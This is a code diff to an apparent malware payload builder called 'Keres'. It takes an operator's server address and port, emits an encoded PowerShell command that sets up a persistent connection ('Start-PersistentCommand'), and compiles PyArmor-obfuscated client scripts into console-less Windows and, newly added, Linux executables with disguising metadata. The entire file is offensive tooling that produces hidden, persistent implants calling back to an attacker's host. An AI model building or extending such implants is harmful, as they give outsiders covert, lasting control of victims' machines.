@@ -13,13 +13,59 @@ def display_ansi_art(file_path):
         ansi_art = file.read()
     print(ansi_art)
 
-
-def create_exe(py_file):
+def create_linux(py_file):
     try:
+       
         icons_directory = "icons"
         icon_file = os.path.join(icons_directory, 'keres.ico')  # Default icon file path
         is_windows = platform.system().lower() == "windows"
         python_executable = "python" if is_windows else "python3"
+        if platform.system().lower() == "windows":
+            raise Exception("You need to compile in a Linux environment .")
+        nuitka_command = [
+            python_executable, "-m", "nuitka",
+            "--onefile",
+            "--company-name=Keres",
+            "--file-version=1.2",
+            "--copyright=COPYRIGHT@Keres",
+            "--trademarks=No Enemies",
+            f"--windows-icon-from-ico=icons/keres.ico",
+            "--disable-console",
+            "--standalone",
+            "--remove-output",
+            f"--output-dir=Output",
+            f"--output-filename=Keres",
+            "--include-package=pyarmor_runtime_000000",
+            py_file
+        ]
+        try:
+            subprocess.run(["pyarmor", "cfg", "restrict_module=0"])
+        except subprocess.CalledProcessError as e:
+            print(f"Error in subprocess: {e}")
+
+        try:
+            subprocess.run(["pyarmor", "g", "lkeres.py"])
+        except subprocess.CalledProcessError as e:
+            print(f"Error in subprocess: {e}")
+
+        try:
+            py_file = './dist/lkeres.py' if os.path.exists('./dist/lkeres.py') else './lkeres.py'
+            subprocess.run(nuitka_command)
+        except subprocess.CalledProcessError as e:
+            print(f"Error in subprocess: {e}")
+
+        print("Linux Executable creation process completed.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+def create_exe(py_file):
+    try:
+       
+        icons_directory = "icons"
+        icon_file = os.path.join(icons_directory, 'keres.ico')  # Default icon file path
+        is_windows = platform.system().lower() == "windows"
+        python_executable = "python" if is_windows else "python3"
+        if platform.system().lower() != "windows":
+            raise Exception("You need to compile in a Windows environment .")
         nuitka_command = [
             python_executable, "-m", "nuitka",
             "--onefile",
@@ -47,11 +93,12 @@ def create_exe(py_file):
             print(f"Error in subprocess: {e}")
 
         try:
+            py_file = './dist/pewpew.py' if os.path.exists('./dist/pewpew.py') else './pewpew.py'
             subprocess.run(nuitka_command)
         except subprocess.CalledProcessError as e:
             print(f"Error in subprocess: {e}")
 
-        print("Executable creation process completed.")
+        print("windows Executable creation process completed.")
     except Exception as e:
         print(f"An error occurred: {e}")
 def encode_powershell_command(command):
@@ -89,6 +136,7 @@ def main():
     parser.add_argument("-a", "--address", required=True, help="Specify the target address")
     parser.add_argument("-p", "--port", required=True, type=int, help="Specify the target port")
     parser.add_argument("-Ps", "--save_ps_command", action="store_true", help="Save the PowerShell payload to a Keres.ps1 file in the Output folder")
+    parser.add_argument("-Pl", "--platform", choices=['Linux', 'Windows'], help="Choose the targeted platform (Linux or Windows)")
 
     args = parser.parse_args()
     server_address = args.address
@@ -149,6 +197,7 @@ Start-PersistentCommand -UniqueIdentifier "Keres" -ServerAddress "{server_addres
         print('\n')
         print(f"PowerShell command saved to: {ps_file_path}")
         return
+    
     if hasattr(sys, '_MEIPASS'):
         bundle_dir = sys._MEIPASS
     else:
@@ -167,7 +216,11 @@ Start-PersistentCommand -UniqueIdentifier "Keres" -ServerAddress "{server_addres
     with open(paw_path, 'w') as paw_file:
         paw_file.write(new_paw_contents)
 
-
+    if args.platform =='Linux':
+        
+        create_linux("./dist/lkeres.py")
+        print("Finished creating the executable in Output folder.")
+        sys.exit()
 
     print('\n')
     print('generated  Powershell command')
@@ -178,7 +231,7 @@ Start-PersistentCommand -UniqueIdentifier "Keres" -ServerAddress "{server_addres
     print('\n')
     create_exe('./dist/pewpew.py')
     print("Finished creating the executable in Output folder.")
-    print(encoded_ps_command)
+    
 
 if __name__ == "__main__":
     main()
